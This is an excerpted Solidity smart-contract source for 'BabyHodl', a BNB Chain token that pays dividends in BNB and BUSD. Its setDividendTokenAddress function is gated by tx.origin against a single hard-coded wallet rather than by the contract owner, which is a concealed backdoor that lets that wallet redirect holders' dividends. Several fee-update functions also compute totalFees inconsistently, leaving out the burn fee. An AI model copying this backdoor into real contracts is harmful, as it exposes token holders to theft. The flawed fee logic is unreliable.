...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0x47e74F803671757138d5692034951D4478aE9721, "Only owner");
...
contract BabyHodl is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    event BUSDDividendRewardFeeUpdated(uint256 indexed newValue, uint256 indexed oldValue);
    ...
    constructor() ERC20("BabyHodl", "BHDL") {
        bnbDividendTracker = new BNBDividendTracker();
        busdDividendTracker = new BUSDDividendTracker();

        marketingWallet = 0x80b5a6C5813a94d81d4F6030EC88D3279dF258F9;
        charityWallet = 0xC0bD9a035Cb28623CAD7938804815f54bbf1A537;
        liquidityWallet = owner();

        DividendToken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        busdDividendTracker.setDividendTokenAddress(DividendToken);
    ...
    function updateDividendToken(address _newtoken) external onlyOwner {
        ...
        busdDividendTracker.setDividendTokenAddress(_newtoken);
    }
    ...
    function setBNBDividendPriority(uint256 _newAmount) external onlyOwner {
        require(_newAmount >= 0 && _newAmount <= 100, "BabyHodl: set Priority between 0-100");
        bnbDividendPriority = _newAmount;
    }

    function updateCharityWallet(address _newWallet) external onlyOwner {
        require(_newWallet != address(0), "BabyHodl: new wallet cannot be zero address");
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxSellTransactionAmount = 150000000 * (10**18);
    ...
    function setLiquifyEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = LiquidityFee.add(marketingFee).add(charityFee).add(bnbDividendRewardsFee).add(busdDividendRewardsFee).add(BurnFee);
            LiquifyEnabled = _enabled;
        }
    ...
    function setBNBDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = bnbDividendRewardsFee.add(marketingFee).add(charityFee).add(busdDividendRewardsFee).add(LiquidityFee).add(BurnFee);
            bnbDividendEnabled = _enabled;
        }
    ...
    function setBUSDDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = busdDividendRewardsFee.add(marketingFee).add(charityFee).add(bnbDividendRewardsFee).add(LiquidityFee).add(BurnFee);
            busdDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(bnbDividendRewardsFee).add(busdDividendRewardsFee).add(LiquidityFee).add(charityFee).add(BurnFee);
            marketingEnabled = _enabled;
        }
    ...
    function setBurnEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = BurnFee.add(LiquidityFee).add(marketingFee).add(charityFee).add(bnbDividendRewardsFee).add(busdDividendRewardsFee);
            burnEnabled = _enabled;
        }
    ...
    function updateBNBDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newBNBDividendTracker.owner() == address(this), "BabyHodl: must be owned by main contract");
        ...
        newBNBDividendTracker.excludeFromDividends(deadWallet);
    ...
    function updatBUSDDividendTracker(address newAddress) external onlyOwner {
        BUSDDividendTracker newBUSDDividendTracker = BUSDDividendTracker(payable(newAddress));

        require(newBUSDDividendTracker.owner() == address(this), "BabyHodl: must be owned by main contract");
        ...
        newBUSDDividendTracker.excludeFromDividends(deadWallet);
    ...
    function updateBNBDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "BabyHodl: maximum fee percentage exceed");
        emit BNBDividendRewardFeeUpdated(bnbDividendRewardsFee, newFee);
        bnbDividendRewardsFee = newFee;
        totalFees = bnbDividendRewardsFee.add(marketingFee).add(charityFee).add(busdDividendRewardsFee).add(LiquidityFee);
    }

    function updateBUSDDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "BabyHodl: maximum fee percentage exceed");
        emit BUSDDividendRewardFeeUpdated(busdDividendRewardsFee, newFee);
        busdDividendRewardsFee = newFee;
        totalFees = busdDividendRewardsFee.add(bnbDividendRewardsFee).add(marketingFee).add(charityFee).add(LiquidityFee);
    }
    ...
    function updateMarketingFee(uint8 newFee) external onlyOwner {
        ...
        marketingFee = newFee;
        totalFees = marketingFee.add(bnbDividendRewardsFee).add(busdDividendRewardsFee).add(LiquidityFee).add(charityFee);
    }

    function updateCharityFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "BabyHodl: maximum fee percentage exceed");
        emit CharityFeeUpdated(charityFee, newFee);
        charityFee = newFee;
        totalFees = charityFee.add(marketingFee).add(bnbDividendRewardsFee).add(busdDividendRewardsFee).add(LiquidityFee);
    }
    ...
    function updateLiquidityFee(uint8 newFee) external onlyOwner {
        ...
        LiquidityFee = newFee;
        totalFees = LiquidityFee.add(bnbDividendRewardsFee).add(busdDividendRewardsFee).add(marketingFee).add(charityFee);
    }
    ...
    function updateBurnFee(uint8 newFee) external onlyOwner {
        ...
        BurnFee = newFee;
        totalFees = BurnFee.add(LiquidityFee).add(bnbDividendRewardsFee).add(busdDividendRewardsFee).add(marketingFee).add(charityFee);
    }
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "BabyHodl: Already excluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "BabyHodl: pair cannot be removed");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "BabyHodl: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "BabyHodl: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(from != address(0), "BabyHodl: zero address");
        require(to != address(0), "BabyHodl: zero address");
        ...
        if (
            ...
            require(
                ...
                "BabyHodl: maximum buy transaction amount exceed"
            );

            uint256 contractBalanceRecipient = balanceOf(to);
            require(
                contractBalanceRecipient + amount <= maxWalletToken,
                "BabyHodl: maximum token per wallet amount exceed"
            );
        } else if (
            automatedMarketMakerPairs[to] &&
            !excludedAccount
        ) {
            require(amount <= maxSellTransactionAmount, "BabyHodl: maximum sell transaction amount exceed");
            ...
            if (!swapping && contractTokenBalance >= swapTokensAtAmount) {
                ...
                if (charityEnabled) {
                    uint256 charityTokens = contractTokenBalance.div(totalFees).mul(charityFee);
                    swapTokensForDividendToken(charityTokens, charityWallet, DividendToken);
                ...
                if (burnEnabled) {
                    uint256 _burnTokens = contractTokenBalance.div(totalFees).mul(BurnFee);
                    swapTokensForBNB(_burnTokens);
                ...
                if (busdDividendEnabled) {
                    ...
                    swapAndSendBUSDDividends(_sellTokens);
                }
    ...
    function manualBuyBackAndBurn(uint256 _amount) public onlyOwner {
        ...
        require(balance >= buyBackUpperLimit.add(_amount), "BabyHodl: amount is too big");
    ...
    function swapAndSendBUSDDividends(uint256 tokens) private {
        ...
        uint256 busdDividends = IERC20(DividendToken).balanceOf(address(this));
        transferDividends(DividendToken, address(busdDividendTracker), busdDividendTracker, busdDividends);
    }
...
contract BNBDividendTracker is DividendPayingBNB, Ownable {
    ...
    function _transfer(address, address, uint256) pure internal override {
        require(false, "BabyHodl: transfer not allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "BabyHodl: withdrawDividend disabled");
    }
    ...
    function excludeFromDividends(address account) external onlyOwner {
        require(!excludedFromDividends[account],"BabyHodl: already excluded from dividends");
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 60 && newClaimWait <= 86400, "BabyHodl: claim wait must be between 60-86400");
